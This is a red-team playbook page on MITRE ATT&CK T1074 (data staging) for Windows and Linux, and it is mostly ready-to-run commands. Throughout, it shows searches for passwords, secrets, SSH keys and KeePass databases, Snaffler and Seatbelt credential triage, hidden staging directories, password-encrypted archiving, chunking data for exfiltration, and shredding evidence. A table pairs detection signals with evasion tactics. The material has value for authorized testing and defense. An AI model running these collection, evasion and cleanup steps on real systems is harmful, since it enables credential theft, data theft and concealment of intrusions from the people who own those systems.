# Data Staging & Preparation

> **MITRE ATT&CK**: Collection > T1074 - Data Staged
> **Platforms**: Windows, Linux
> **Required Privileges**: User (read access to target data)
> **OPSEC Risk**: Medium (file access logs, staging artifacts, compression tool usage)

## Strategic Overview

Data staging is the bridge between discovery and exfiltration. The goal is to identify, collect, and prepare data for extraction while minimizing forensic artifacts. A Red Team Lead must ensure operators understand that this phase has two failure modes: collecting too much (triggering DLP, filling disks, leaving massive artifacts) and collecting too little (missing engagement objectives). The discipline is in knowing exactly what the client cares about -- crown jewels -- and surgically extracting only that.

**Staging workflow**: Identify target data -> Search and locate -> Stage to a single collection point -> Compress and encrypt -> Exfiltrate -> Clean up staging artifacts.

## Technical Deep-Dive

### Identifying Valuable Data

Priority targets by engagement type:
- **Financial services**: Customer PII, trading algorithms, financial reports, compliance data
- **Healthcare**: PHI/ePHI, patient records, research data
- **Technology**: Source code, API keys, intellectual property, design documents
- **General**: Credentials, email archives, network diagrams, Active Directory database

### Searching for Sensitive Files (Windows)

```cmd
:: Search for password/credential files
findstr /si "password" *.txt *.xml *.config *.ini *.env
findstr /si "connectionstring" *.config *.xml
findstr /si "secret" *.json *.yaml *.yml

:: Find files by name pattern
dir /s /b *pass* *cred* *secret* *sensitive* *confidential*
dir /s /b *.kdbx *.pfx *.p12 *.pem *.key *.pgp
dir /s /b *.sql *.bak *.mdb *.accdb

:: Find recently modified documents
forfiles /P C:\Users /S /M *.docx /D +30 /C "cmd /c echo @path @fdate"
forfiles /P C:\Users /S /M *.xlsx /D +30 /C "cmd /c echo @path @fdate"

:: PowerShell file search (more flexible)
Get-ChildItem -Path C:\Users -Recurse -Include *.docx,*.xlsx,*.pdf -ErrorAction SilentlyContinue | Where-Object {$_.LastWriteTime -gt (Get-Date).AddDays(-90)} | Select FullName,Length,LastWriteTime
```

### Searching for Sensitive Files (Linux)

```bash
# Find configuration files with credentials
grep -ril "password\|passwd\|secret\|api_key\|token" /etc/ /opt/ /var/ 2>/dev/null
find / -name "*.env" -o -name "*.config" -o -name "*.conf" 2>/dev/null | xargs grep -l "password" 2>/dev/null

# Database files
find / -name "*.sql" -o -name "*.db" -o -name "*.sqlite" 2>/dev/null

# SSH keys and certificates
find / -name "id_rsa" -o -name "id_ed25519" -o -name "*.pem" -o -name "*.key" 2>/dev/null

# Recently modified files in user directories
find /home -type f -mtime -30 -name "*.pdf" -o -name "*.docx" -o -name "*.xlsx" 2>/dev/null
```

### Snaffler (Automated Share Trawling)

```powershell
# Snaffler -- automated file share content trawling
# Searches network shares for sensitive files based on rules
.\Snaffler.exe -s -o snaffler_results.log

# Target specific domain
.\Snaffler.exe -d CORP.LOCAL -o snaffler_results.log

# Increase verbosity for more findings
.\Snaffler.exe -s -v data -o snaffler_results.log

# Snaffler classifies findings by severity:
# Black = credentials/keys, Red = sensitive config, Orange = interesting, Green = informational
```

### SeatBelt (Host Triage)

```powershell
# SeatBelt -- rapid host triage and data identification
.\Seatbelt.exe -group=all             # Full enumeration
.\Seatbelt.exe InterestingFiles       # Files of interest
.\Seatbelt.exe CloudCredentials       # Cloud credential files
.\Seatbelt.exe CredEnum               # Windows credential manager
.\Seatbelt.exe KeePass                # KeePass database files
```

### Staging Locations

```cmd
:: Windows staging locations (less monitored)
C:\Windows\Temp\
C:\ProgramData\
C:\Users\Public\
%APPDATA%\Microsoft\
:: Create hidden directory
mkdir C:\Windows\Temp\.staging & attrib +h C:\Windows\Temp\.staging
```

```bash
# Linux staging locations
/dev/shm/                    # tmpfs -- no disk write, cleared on reboot
/tmp/.staging/               # Dot prefix for hidden
/var/tmp/                    # Persists across reboots but less monitored
```

### Data Compression and Encryption

```cmd
:: 7-Zip with password encryption (AES-256)
7z a -pRedTeam2024! -mhe=on C:\Windows\Temp\data.7z C:\staging\*
:: -p = password, -mhe=on = encrypt filenames too

:: PowerShell native compression
Compress-Archive -Path C:\staging\* -DestinationPath C:\Windows\Temp\data.zip
```

```bash
# Linux compression with encryption
tar czf - /path/to/data/ | openssl enc -aes-256-cbc -pbkdf2 -out /dev/shm/data.enc -k 'RedTeam2024!'

# GPG encryption
tar czf /dev/shm/data.tar.gz /path/to/data/
gpg --symmetric --cipher-algo AES256 /dev/shm/data.tar.gz

# Split large files into chunks for staged exfiltration
split -b 10M /dev/shm/data.enc /dev/shm/chunk_
```

### Chunking Large Datasets

```bash
# Reassemble on attacker side after chunked exfiltration
cat chunk_* > data.enc
openssl enc -d -aes-256-cbc -pbkdf2 -in data.enc -out data.tar.gz -k 'RedTeam2024!'
```

### Evidence Minimization

```cmd
:: Clean staging artifacts after exfiltration, overwrite free space
del /f /q C:\Windows\Temp\data.7z & rmdir C:\Windows\Temp\.staging & cipher /w:C:\Windows\Temp\
```

```bash
# Secure delete on Linux (shred overwrites before unlinking)
shred -vfz -n 3 /dev/shm/data.enc && rm -rf /dev/shm/staging/
```

## Detection & Evasion

| Activity | Detection Vector | Evasion Approach |
|----------|-----------------|------------------|
| Mass file access | File audit logs (4663), EDR file telemetry | Access files slowly, during business hours |
| Compression tools | Process monitoring (7z.exe, rar.exe) | Use PowerShell native, or bring renamed binary |
| Large staging files | Disk usage monitoring, DLP | Stage in memory (/dev/shm), chunk into small files |
| Snaffler execution | EDR process detection | Run from compromised server, not monitored workstation |
| Network share access | SMB audit logs (5140, 5145) | Use existing user credentials, access during work hours |

**OPSEC principles**: Never stage data on the same host you are operating from if avoidable. Prefer staging on a compromised server with less monitoring. Always encrypt before exfiltration -- even if caught, the data is protected. Clean up staging artifacts immediately after successful exfiltration.

## Cross-References

- [Exfiltration Channels](./exfiltration-channels.md)
- [Cloud Exfiltration](./cloud-exfiltration.md)
- [Discovery - Network](../08-discovery/network-discovery.md)
- [Persistence Cleanup](../13-reporting/)

## References

- MITRE ATT&CK T1074: https://attack.mitre.org/techniques/T1074/
- Snaffler: https://github.com/SnaffCon/Snaffler
- Seatbelt: https://github.com/GhostPack/Seatbelt
- MITRE T1005 (Data from Local System): https://attack.mitre.org/techniques/T1005/
